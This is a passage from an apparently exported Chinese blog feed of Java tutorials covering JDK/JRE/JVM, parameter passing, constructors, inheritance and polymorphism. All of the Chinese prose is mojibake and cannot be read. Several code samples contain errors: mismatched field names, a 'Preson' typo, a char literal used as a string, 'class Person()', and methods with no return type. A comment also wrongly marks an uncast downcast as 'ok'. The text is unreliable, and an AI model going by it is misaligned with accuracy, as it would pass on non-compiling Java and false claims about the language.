    <content><![CDATA[<h1 id="JavaåŸºç¡€å­¦ä¹ ä¹‹JDKã€JREã€JVM">JavaåŸºç¡€å­¦ä¹ ä¹‹JDKã€JREã€JVM</h1>
<p>æœ€è¿‘å¸®ä¸€ä¸ªå¸ˆå…„åšCiscoçš„è½¯ä»¶å·¥ç¨‹å¸ˆé¢è¯•é¢˜ï¼Œå‘ç°è¿˜é—®åˆ°äº†JDKã€JREå’ŒJVMä¹‹é—´çš„å…³ç³»ï¼Œè™½ç„¶çœ‹èµ·æ¥æ¯”è¾ƒåŸºç¡€ï¼Œä½†æ˜¯å¯¹è¿™ä¸ªæ¦‚å¿µè¿˜æ˜¯å¾ˆæ¨¡ç³Šï¼Œæ²¡æœ‰å½¢æˆä¸€ä¸ªæœ‰æ•ˆçš„æ¡†æ¶ï¼Œå€Ÿç”¨å»–é›ªå³°å¸ˆå‚…çš„ä¸€å¼ å›¾æ¥è¯´æ˜ï¼Œä¸€å›¾èƒœåƒè¨€ã€‚</p>
<p><img src="https://i.loli.net/2019/09/23/nzXvPx8OUaHZftM.png" alt=""></p>
<ul>
<li>JDKï¼šJava Develop Kit</li>
<li>JREï¼šJava Runtime Environment</li>
</ul>
<p>ç®€å•åœ°è¯´ï¼ŒJREå°±æ˜¯è¿è¡ŒJavaå­—èŠ‚ç çš„è™šæ‹Ÿæœºã€‚ä½†æ˜¯ï¼Œå¦‚æœåªæœ‰Javaæºç ï¼Œè¦ç¼–è¯‘æˆJavaå­—èŠ‚ç ï¼Œå°±éœ€è¦JDKï¼Œå› ä¸ºJDKé™¤äº†åŒ…å«JREï¼Œè¿˜æä¾›äº†ç¼–è¯‘å™¨ã€è°ƒè¯•å™¨ç­‰å¼€å‘å·¥å…·ã€‚</p>
<p>å†è´´ä¸€å¼ Javaæ‰§è¡Œä»£ç è¿‡ç¨‹çš„å›¾ï¼š</p>
<p><img src="https://i.loli.net/2019/09/23/moDQOvws792jehT.png" alt=""></p>
<p>è¿™é‡Œå†ç®€å•çš„è¯´ä¸€ä¸‹<strong>Java ä¸ºä»€ä¹ˆèƒ½è·¨å¹³å°ï¼Œå®ç°ä¸€æ¬¡ç¼–å†™ï¼Œå¤šå¤„è¿è¡Œï¼Ÿ</strong></p>
<p>Java èƒ½å¤Ÿè·¨å¹³å°è¿è¡Œçš„æ ¸å¿ƒåœ¨äº JVM ã€‚ä¸æ˜¯ Java èƒ½å¤Ÿè·¨å¹³å°ï¼Œè€Œæ˜¯å®ƒçš„ jvm èƒ½å¤Ÿè·¨å¹³å°ã€‚ Java å¼•å…¥äº†å­—èŠ‚ç çš„æ¦‚å¿µï¼Œjvm åªèƒ½è®¤è¯†å­—èŠ‚ç ï¼Œå¹¶å°†å®ƒä»¬è§£é‡Šåˆ°ç³»ç»Ÿçš„ API è°ƒç”¨ã€‚é’ˆå¯¹ä¸åŒçš„ç³»ç»Ÿæœ‰ä¸åŒçš„ jvm å®ç°ï¼Œæœ‰ Linux ç‰ˆæœ¬çš„ jvm å®ç°ï¼Œä¹Ÿæœ‰ Windows ç‰ˆæœ¬çš„ jvm å®ç°ï¼Œä½†æ˜¯åŒä¸€æ®µä»£ç åœ¨ç¼–è¯‘åçš„å­—èŠ‚ç æ˜¯ä¸€æ ·çš„ã€‚</p>
]]></content>
      <categories>
        <category>ç¼–ç¨‹</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaåŸºç¡€å­¦ä¹ ä¹‹é¢å‘å¯¹è±¡åŸºç¡€</title>
    <url>/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="JavaåŸºç¡€å­¦ä¹ ä¹‹é¢å‘å¯¹è±¡åŸºç¡€">JavaåŸºç¡€å­¦ä¹ ä¹‹é¢å‘å¯¹è±¡åŸºç¡€</h1>
<h3 id="æ–¹æ³•">æ–¹æ³•</h3>
<h4 id="å¯å˜å‚æ•°">å¯å˜å‚æ•°</h4>
<p>å¯å˜å‚æ•°ç”¨<code>ç±»å‹...</code>å®šä¹‰ï¼Œå¯å˜å‚æ•°ç›¸å½“äºæ•°ç»„ç±»å‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Group</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String[] name;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNames</span><span class="params">(String... names)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.names = names</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="å‚æ•°ç»‘å®š">å‚æ•°ç»‘å®š</h4>
<p>Javaä¸­çš„å‚æ•°ç»‘å®šå…¶å®ä¹Ÿå°±æ˜¯ä¼ å€¼ä¼ é€’å’Œä¼ å€ä¼ é€’ã€‚</p>
<p>æˆ‘ä»¬å…ˆè§‚å¯Ÿä¸€ä¸ªåŸºæœ¬ç±»å‹å‚æ•°çš„ä¼ é€’ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">15</span>; <span class="comment">// nçš„å€¼ä¸º15</span></span><br><span class="line">        p.setAge(n); <span class="comment">// ä¼ å…¥nçš„å€¼</span></span><br><span class="line">        System.out.println(p.getAge()); <span class="comment">// 15</span></span><br><span class="line">        n = <span class="number">20</span>; <span class="comment">// nçš„å€¼æ”¹ä¸º20</span></span><br><span class="line">        System.out.println(p.getAge()); <span class="comment">// 15</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä»ç»“æœå¯çŸ¥ï¼Œä¿®æ”¹å¤–éƒ¨çš„å±€éƒ¨å˜é‡<code>n</code>ï¼Œä¸å½±å“å®ä¾‹<code>p</code>çš„<code>age</code>å­—æ®µï¼ŒåŸå› æ˜¯<code>setAge()</code>æ–¹æ³•è·å¾—çš„å‚æ•°ï¼Œå¤åˆ¶äº†<code>n</code>çš„å€¼ï¼Œå› æ­¤ï¼Œ<code>p.age</code>å’Œå±€éƒ¨å˜é‡<code>n</code>äº’ä¸å½±å“ã€‚</p>
<p><strong>ç»“è®ºï¼šåŸºæœ¬ç±»å‹å‚æ•°çš„ä¼ é€’ï¼Œæ˜¯è°ƒç”¨æ–¹å€¼çš„å¤åˆ¶ã€‚åŒæ–¹å„è‡ªçš„åç»­ä¿®æ”¹ï¼Œäº’ä¸å½±å“ã€‚</strong></p>
<p>æˆ‘ä»¬å†çœ‹ä¸€ä¸ªä¼ é€’å¼•ç”¨å‚æ•°çš„ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        String[] fullname = <span class="keyword">new</span> String[] &#123; <span class="string">&quot;Homer&quot;</span>, <span class="string">&quot;Simpson&quot;</span> &#125;;</span><br><span class="line">        p.setName(fullname); <span class="comment">// ä¼ å…¥fullnameæ•°ç»„</span></span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Homer Simpson&quot;</span></span><br><span class="line">        fullname[<span class="number">0</span>] = <span class="string">&quot;Bart&quot;</span>; <span class="comment">// fullnameæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¿®æ”¹ä¸º&quot;Bart&quot;</span></span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Bart Simpson&quot;?</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String[] name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name[<span class="number">0</span>] + <span class="string">&quot; &quot;</span> + <span class="keyword">this</span>.name[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String[] name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„åˆ°<code>setName()</code>çš„å‚æ•°ç°åœ¨æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚ä¸€å¼€å§‹ï¼ŒæŠŠ<code>fullname</code>æ•°ç»„ä¼ è¿›å»ï¼Œç„¶åï¼Œä¿®æ”¹<code>fullname</code>æ•°ç»„çš„å†…å®¹ï¼Œç»“æœå‘ç°ï¼Œå®ä¾‹<code>p</code>çš„å­—æ®µ<code>p.name</code>ä¹Ÿè¢«ä¿®æ”¹äº†ï¼</p>
<p><strong>ç»“è®ºï¼šå¼•ç”¨ç±»å‹å‚æ•°çš„ä¼ é€’ï¼Œè°ƒç”¨æ–¹çš„å˜é‡ï¼Œå’Œæ¥æ”¶æ–¹çš„å‚æ•°å˜é‡ï¼ŒæŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡ã€‚åŒæ–¹ä»»æ„ä¸€æ–¹å¯¹è¿™ä¸ªå¯¹è±¡çš„ä¿®æ”¹ï¼Œéƒ½ä¼šå½±å“å¯¹æ–¹</strong></p>
<p>å†æ¥çœ‹ä¸€ä¸ªå¼•ç”¨ç±»å‹çš„å‚æ•°ç»‘å®šï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        String bob = <span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">        p.setName(bob); <span class="comment">// ä¼ å…¥bobå˜é‡</span></span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Bob&quot;</span></span><br><span class="line">        bob = <span class="string">&quot;Alice&quot;</span>; <span class="comment">// bobæ”¹åä¸ºAlice</span></span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// æ³¨æ„ï¼šè¿˜æ˜¯&quot;Bob&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>String[] fullname</code>ä¼ é€’ç»™<code>p.name</code>çš„æ˜¯å †ä¸­çš„åœ°å€ï¼Œå…±åŒæ“ä½œå †ä¸­çš„å†…å®¹ã€‚<code>bob</code>ä¼ é€’ç»™<code>p.name</code>ä»¥åä¸¤è€…å‡æŒ‡å‘å¸¸é‡æ± çš„<code>Bob</code>ï¼Œå<code>bob</code>æŒ‡å‘äº†å¸¸é‡æ± ä¸­çš„<code>Alice</code>ï¼Œä½†æ˜¯<code>p.name</code>ä»ç„¶æŒ‡å‘<code>Bob</code>ï¼Œå†ä¸€æ¬¡ <code>p.setName(bob);</code>çš„è¯<code>p.name</code>å°†æŒ‡å‘<code>Alice</code>ã€‚</p>
<h3 id="æ„é€ æ–¹æ³•">æ„é€ æ–¹æ³•</h3>
<h4 id="é»˜è®¤æ„é€ æ–¹æ³•">é»˜è®¤æ„é€ æ–¹æ³•</h4>
<p>åœ¨Javaä¸­ï¼Œåˆ›å»ºå¯¹è±¡å®ä¾‹çš„æ—¶å€™ï¼ŒæŒ‰ç…§å¦‚ä¸‹é¡ºåºè¿›è¡Œåˆå§‹åŒ–ï¼š</p>
<ol>
<li>å…ˆåˆå§‹åŒ–å­—æ®µï¼Œä¾‹å¦‚ï¼Œ<code>int age = 10;</code>è¡¨ç¤ºå­—æ®µåˆå§‹åŒ–ä¸º<code>10</code>ï¼Œ<code>double salary;</code>è¡¨ç¤ºå­—æ®µé»˜è®¤åˆå§‹åŒ–ä¸º<code>0</code>ï¼Œ<code>String name;</code>è¡¨ç¤ºå¼•ç”¨ç±»å‹å­—æ®µé»˜è®¤åˆå§‹åŒ–ä¸º<code>null</code>ï¼›</li>
<li>æ‰§è¡Œæ„é€ æ–¹æ³•çš„ä»£ç è¿›è¡Œåˆå§‹åŒ–ã€‚</li>
</ol>
<h4 id="å¤šæ„é€ æ–¹æ³•">å¤šæ„é€ æ–¹æ³•</h4>
<p>å¯ä»¥å®šä¹‰å¤šä¸ªæ„é€ æ–¹æ³•ï¼Œåœ¨é€šè¿‡<code>new</code>æ“ä½œç¬¦è°ƒç”¨çš„æ—¶å€™ï¼Œç¼–è¯‘å™¨é€šè¿‡æ„é€ æ–¹æ³•çš„å‚æ•°æ•°é‡ã€ä½ç½®å’Œç±»å‹è‡ªåŠ¨åŒºåˆ†ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœè°ƒç”¨<code>new Person(&quot;Xiao Ming&quot;, 20);</code>ï¼Œä¼šè‡ªåŠ¨åŒ¹é…åˆ°æ„é€ æ–¹æ³•<code>public Person(String, int)</code>ã€‚</p>
<p>å¦‚æœè°ƒç”¨<code>new Person(&quot;Xiao Ming&quot;);</code>ï¼Œä¼šè‡ªåŠ¨åŒ¹é…åˆ°æ„é€ æ–¹æ³•<code>public Person(String)</code>ã€‚</p>
<p>å¦‚æœè°ƒç”¨<code>new Person();</code>ï¼Œä¼šè‡ªåŠ¨åŒ¹é…åˆ°æ„é€ æ–¹æ³•<code>public Person()</code>ã€‚</p>
<p>ä¸€ä¸ªæ„é€ æ–¹æ³•å¯ä»¥è°ƒç”¨å…¶ä»–æ„é€ æ–¹æ³•ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¾¿äºä»£ç å¤ç”¨ã€‚è°ƒç”¨å…¶ä»–æ„é€ æ–¹æ³•çš„è¯­æ³•æ˜¯<code>this(â€¦)</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>()</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span></span>&#123; <span class="comment">//è°ƒç”¨Person(String, int)æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">this</span>(name, <span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="string">&#x27;Unnamed&#x27;</span>) <span class="comment">//è°ƒç”¨Person(String)æ„é€ æ–¹æ³•</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ–¹æ³•é‡è½½">æ–¹æ³•é‡è½½</h3>
<p>åœ¨ä¸€ä¸ªç±»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰å¤šä¸ªæ–¹æ³•ã€‚å¦‚æœæœ‰ä¸€ç³»åˆ—æ–¹æ³•ï¼Œå®ƒä»¬çš„åŠŸèƒ½éƒ½æ˜¯ç±»ä¼¼çš„ï¼Œåªæœ‰å‚æ•°æœ‰æ‰€ä¸åŒï¼Œé‚£ä¹ˆï¼Œå¯ä»¥æŠŠè¿™ä¸€ç»„æ–¹æ³•ååšæˆ<strong>åŒå</strong>æ–¹æ³•ã€‚è¿™ç§æ–¹æ³•åç›¸åŒï¼Œä½†å„è‡ªçš„å‚æ•°ä¸åŒï¼Œç§°ä¸ºæ–¹æ³•é‡è½½ï¼ˆ<code>Overload</code>ï¼‰ã€‚</p>
<p>æ³¨æ„ï¼š<strong>æ–¹æ³•é‡è½½çš„è¿”å›å€¼ç±»å‹é€šå¸¸éƒ½æ˜¯ç›¸åŒçš„</strong>ã€‚</p>
<h3 id="ç»§æ‰¿">ç»§æ‰¿</h3>
<p><code>protected</code>å…è®¸å­ç±»è®¿é—®çˆ¶ç±»çš„å­—æ®µå’Œæ–¹æ³•ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Student s = <span class="keyword">new</span> Student(<span class="string">&quot;Xiao Ming&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> score;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age, <span class="keyword">int</span> score)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œä¸Šé¢çš„ä»£ç ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªç¼–è¯‘é”™è¯¯ï¼Œå¤§æ„æ˜¯åœ¨<code>Student</code>çš„æ„é€ æ–¹æ³•ä¸­ï¼Œæ— æ³•è°ƒç”¨<code>Person</code>çš„æ„é€ æ–¹æ³•ã€‚è¿™æ˜¯å› ä¸ºåœ¨Javaä¸­ï¼Œä»»ä½•<code>class</code>çš„æ„é€ æ–¹æ³•ï¼Œç¬¬ä¸€è¡Œè¯­å¥å¿…é¡»æ˜¯è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•ã€‚å¦‚æœæ²¡æœ‰æ˜ç¡®åœ°è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œç¼–è¯‘å™¨ä¼šå¸®æˆ‘ä»¬è‡ªåŠ¨åŠ ä¸€å¥<code>super();</code></p>
<p>ä½†æ˜¯ï¼Œ<code>Person</code>ç±»å¹¶æ²¡æœ‰æ— å‚æ•°çš„æ„é€ æ–¹æ³•ï¼Œå› æ­¤ï¼Œç¼–è¯‘å¤±è´¥ã€‚è§£å†³æ–¹æ³•æ˜¯è°ƒç”¨<code>Person</code>ç±»å­˜åœ¨çš„æŸä¸ªæ„é€ æ–¹æ³•ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> score;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age, <span class="keyword">int</span> score)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name, age);</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ç»“è®ºï¼š</strong></p>
<ol>
<li>å¦‚æœçˆ¶ç±»æ²¡æœ‰é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼Œå­ç±»å°±å¿…é¡»æ˜¾å¼è°ƒç”¨<code>super()</code>å¹¶ç»™å‡ºå‚æ•°ä»¥ä¾¿è®©ç¼–è¯‘å™¨å®šä½åˆ°çˆ¶ç±»çš„ä¸€ä¸ªåˆé€‚çš„æ„é€ æ–¹æ³•ã€‚</li>
<li>å­ç±»ä¸ä¼šç»§æ‰¿ä»»ä½•çˆ¶ç±»çš„æ„é€ æ–¹æ³•ã€‚å­ç±»é»˜è®¤çš„æ„é€ æ–¹æ³•æ˜¯ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä¸æ˜¯ç»§æ‰¿çš„ã€‚</li>
</ol>
<p>Javaå…è®¸å‘ä¸Šè½¬å‹ï¼Œä¸å…è®¸å‘ä¸‹è½¬å‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person p1 = <span class="keyword">new</span> Student(); <span class="comment">//upcasting ok</span></span><br><span class="line">Person p2 = <span class="keyword">new</span> Preson();</span><br><span class="line">Student s1 = p1; <span class="comment">// ok</span></span><br><span class="line">Student s2 = p2 <span class="comment">//error</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="å¤šæ€">å¤šæ€</h3>
<p><strong>å®šä¹‰ï¼šå¤šæ€æ˜¯æŒ‡ï¼Œé’ˆå¯¹æŸä¸ªç±»å‹çš„æ–¹æ³•è°ƒç”¨ï¼Œå…¶çœŸæ­£æ‰§è¡Œçš„æ–¹æ³•å–å†³äºè¿è¡Œæ—¶æœŸå®é™…ç±»å‹çš„æ–¹æ³•ã€‚</strong></p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> class <span class="title">Main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">// ç»™ä¸€ä¸ªæœ‰æ™®é€šæ”¶å…¥ã€å·¥èµ„æ”¶å…¥å’Œäº«å—å›½åŠ¡é™¢ç‰¹æ®Šæ´¥è´´çš„å°ä¼™ä¼´ç®—ç¨:</span></span><br><span class="line">        Income[] incomes = <span class="keyword">new</span> Income[] &#123;</span><br><span class="line">            <span class="keyword">new</span> Income(<span class="number">3000</span>),</span><br><span class="line">            <span class="keyword">new</span> Salary(<span class="number">5000</span>),</span><br><span class="line">            <span class="keyword">new</span> StateCouncilSpecialAllowance(<span class="number">15000</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        System.out.println(totalTax(incomes));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">totalTax</span><span class="params">(Income[] incomes)</span></span>&#123;</span><br><span class="line">        <span class="keyword">double</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(Income income: incomes)&#123;</span><br><span class="line">            total += income.getTax();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Income</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">double</span> income;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Income</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.income = income;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> income * <span class="number">0.1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Salary</span> <span class="keyword">extends</span> <span class="title">Income</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Salary</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.income = income;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">getTax</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (income &lt;= <span class="number">5000</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (income - <span class="number">5000</span>) * <span class="number">0.2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StateCouncilSpecialAllowance</span> <span class="keyword">extends</span> <span class="title">Income</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StateCouncilSpecialAllowance</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.income = income;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">getTax</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
